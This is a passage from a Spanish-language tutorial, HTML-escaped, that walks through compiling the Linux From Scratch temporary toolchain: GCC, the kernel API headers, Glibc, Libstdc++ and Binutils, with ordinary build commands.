make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, ya tendríamos esta utilidad instalada… y lo único que tendríamos que hacer es retroceder a nivel de directorios y borrar el mismo:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3486D.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-gcc&quot;&gt;Compilación GCC&lt;/h5&gt;

&lt;p&gt;Este paquete depende a su vez de otros 3 paquetes, así que tras su descompresión, haremos lo siguiente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3486N.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por aquí os dejo los comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; gcc-9.2.0.tar.xz

&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;gcc-9.2.0

&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; ../mpfr-4.0.2.tar.xz
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; mpfr-4.0.2 mpfr
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; ../gmp-6.2.0.tar.xz
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; gmp-6.2.0 gmp
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; ../mpc-1.1.0.tar.gz
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; mpc-1.1.0 mpc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gcc/config/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;linux,i386/linux&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,64&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;.h
&lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-uv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,.orig&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@/lib\(64\)\?\(32\)\?/ld@/tools&amp;amp;@g'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@/usr@/tools@g'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;.orig &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'
#undef STANDARD_STARTFILE_PREFIX_1
#undef STANDARD_STARTFILE_PREFIX_2
#define STANDARD_STARTFILE_PREFIX_1 &quot;/tools/lib/&quot;
#define STANDARD_STARTFILE_PREFIX_2 &quot;&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;.orig
&lt;span class=&quot;k&quot;&gt;done

case&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
  &lt;/span&gt;x86_64&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/m64=/s/lib64/lib/'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;.orig gcc/config/i386/t-linux64
 &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build

../configure                                       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;                              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools                                &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-glibc-version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2.11                      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-sysroot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;                            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-newlib&lt;/span&gt;                                  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--without-headers&lt;/span&gt;                              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-local-prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools                     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-native-system-header-dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/include &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-nls&lt;/span&gt;                                  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-shared&lt;/span&gt;                               &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-multilib&lt;/span&gt;                             &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-decimal-float&lt;/span&gt;                        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-threads&lt;/span&gt;                              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libatomic&lt;/span&gt;                            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libgomp&lt;/span&gt;                              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libquadmath&lt;/span&gt;                          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libssp&lt;/span&gt;                               &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libvtv&lt;/span&gt;                               &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libstdcxx&lt;/span&gt;                            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--enable-languages&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c,c++

make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Anotación&lt;/strong&gt;: Este paquete puede tardar un poco en instalarse, así que paciencia.&lt;/p&gt;

&lt;p&gt;Una vez instalado, podremos retroceder a nivel de directorios y borrar el recurso descomprimido sin mayor inconveniente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3489L.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-api-headers&quot;&gt;Compilación API Headers&lt;/h5&gt;

&lt;p&gt;En este caso, descomprimiremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux-5.5.3.tar.xz&lt;/code&gt; y ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make mrproper
make headers
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rv&lt;/span&gt; usr/include/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /tools/include
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; linux-5.5.3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ac.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-glibc&quot;&gt;Compilación Glibc&lt;/h5&gt;

&lt;p&gt;Para la instalación de &lt;strong&gt;Glibc&lt;/strong&gt;, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; glibc-2.31.tar.xz
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd       &lt;/span&gt;build

../configure                             &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools                    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;                    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;--build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;../scripts/config.guess&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;--enable-kernel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3.2                &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;--with-headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/include

make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, aplicaremos el siguiente comando para validar que las funciones básicas (compilación y linking) de la nueva toolchain están trabajando correctamente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'int main(){}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dummy.c
&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-gcc&lt;/span&gt; dummy.c
readelf &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; a.out | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;': /tools'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si al ejecutarlo nos sale el siguiente mensaje:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Requesting program interpreter: /tools/lib64/ld-linux-x86-64.so.2]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entonces nos podremos quedar tranquilos. Posteriormente, borramos estos archivos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; dummy.c a.out
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../..
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; glibc-2.31
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ei.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ojo cuidado, ¡hagamos una Snapshot que ya hemos avanzado considerablemente!:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ev.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-libstdc-de-gcc&quot;&gt;Compilación Libstdc de GCC&lt;/h5&gt;

&lt;p&gt;Para instalar esta utilidad, necesitaremos volver a descomprimir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc-9.2.0.tar.xz&lt;/code&gt; una vez más. Una vez hecho, aplicaremos los siguientes comandos dentro del directorio descomprimido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build

../libstdc++-v3/configure           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;                 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools                 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-multilib&lt;/span&gt;              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-nls&lt;/span&gt;                   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libstdcxx-threads&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libstdcxx-pch&lt;/span&gt;         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-gxx-include-dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;/include/c++/9.2.0

make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizado, como siempre… retrocedemos 2 directorios y borramos el directorio:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348kG.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-binutils-fase-2&quot;&gt;Compilación Binutils Fase 2&lt;/h5&gt;

&lt;p&gt;Una vez más, volveremos a descomprimir el comprimido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binutils-2.34.tar.xz&lt;/code&gt; y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; binutils-2.34.tar.xz
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;binutils-2.34

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build

&lt;span class=&quot;nv&quot;&gt;CC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-gcc&lt;/span&gt;                &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;AR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ar&lt;/span&gt;                 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;RANLIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ranlib&lt;/span&gt;         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
../configure                   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-nls&lt;/span&gt;              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-werror&lt;/span&gt;           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-lib-path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/lib &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-sysroot&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;install

&lt;/span&gt;make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; ld clean
make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; ld &lt;span class=&quot;nv&quot;&gt;LIB_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/lib:/lib
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ld/ld-new /tools/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, la misma historia de siempre… retrocedemos 2 directorios y borramos el directorio:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348nQ.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-gcc-fase-2&quot;&gt;Compilación GCC Fase 2&lt;/h5&gt;

&lt;p&gt;Descomprimiremos una vez más el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc-9.2.0.tar.xz&lt;/code&gt; y aplicaremos los siguientes comandos a nivel de sistema:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;gcc/limitx.h gcc/glimits.h gcc/limity.h &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-gcc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-print-libgcc-file-name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/include-fixed/limits.h

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gcc/config/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;linux,i386/linux&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,64&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;.h
&lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-uv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,.orig&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@/lib\(64\)\?\(32\)\?/ld@/tools&amp;amp;@g'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@/usr@/tools@g'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;.orig &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'
#undef STANDARD_STARTFILE_PREFIX_1
#undef STANDARD_STARTFILE_PREFIX_2
#define STANDARD_STARTFILE_PREFIX_1 &quot;/tools/lib/&quot;
#define STANDARD_STARTFILE_PREFIX_2 &quot;&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;.orig
&lt;span class=&quot;k&quot;&gt;done

case&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
  &lt;/span&gt;x86_64&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/m64=/s/lib64/lib/'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;.orig gcc/config/i386/t-linux64
  &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; ../mpfr-4.0.2.tar.xz
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; mpfr-4.0.2 mpfr
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; ../gmp-6.2.0.tar.xz
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; gmp-6.2.0 gmp
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; ../mpc-1.1.0.tar.gz
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; mpc-1.1.0 mpc

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1161 s|^|//|'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; libsanitizer/sanitizer_common/sanitizer_platform_limits_posix.cc

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Toda esta parte debería devolver un output limpio como el siguiente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ou.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Llegados a este punto ejecutamos los siguientes comandos:&lt;/p&gt;

